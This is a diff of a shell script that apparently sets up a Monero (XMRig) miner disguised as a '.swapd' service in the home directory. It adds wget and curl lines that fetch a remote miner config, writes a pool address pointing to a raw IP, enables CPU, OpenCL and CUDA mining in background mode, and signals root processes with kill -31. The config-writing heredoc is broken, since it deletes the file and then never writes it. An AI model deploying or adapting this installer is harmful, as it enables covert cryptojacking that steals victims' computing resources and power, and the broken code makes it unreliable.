@@ -241,25 +241,10 @@ sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
 
-#wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 
-#curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
+curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
 
-rm $HOME/.swapd/config.json
-
-cat $HOME/.swapd/config.json <<EOL
-{
-    "autosave": true,
-    "cpu": true,
-    "opencl": true,
-    "cuda": true,
-    "pools": [
-        {
-            "url": "194.164.63.118:3333"
-        }
-    ]
-}
-EOL
 
 cp $HOME/.swapd/config.json $HOME/.swapd/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_background.json
@@ -448,5 +433,25 @@ fi
 kill -31 $(pgrep -f -u root config.json)
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
+
+echo "[*] Copying xmrig-proxy config"
+
+rm $HOME/.swapd/config.json
+
+cat $HOME/.swapd/config.json <<EOL
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": true,
+    "cuda": true,
+    "pools": [
+        {
+            "url": "194.164.63.118:3333"
+        }
+    ]
+}
+EOL
+
+
 
 echo "[*] Setup complete"
